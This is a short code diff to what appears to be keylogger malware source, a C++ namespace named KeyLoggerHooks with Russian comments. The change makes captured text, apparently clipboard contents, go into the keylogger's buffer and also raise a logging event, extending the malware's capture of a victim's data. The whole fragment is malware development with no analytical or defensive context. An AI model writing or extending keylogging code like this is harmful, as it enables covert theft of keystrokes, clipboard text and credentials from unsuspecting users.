@@ -338,7 +338,10 @@ namespace KeyLoggerHooks
 
 				// Добавляем их в хранилище
 				if (Data != NULL)
+				{
 					KeyLogger::AddStrToBuffer(NULL, Data, 0);
+					KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
+				}
 
 				if( uFormat == CF_UNICODETEXT )
 					STR::Free(Data);
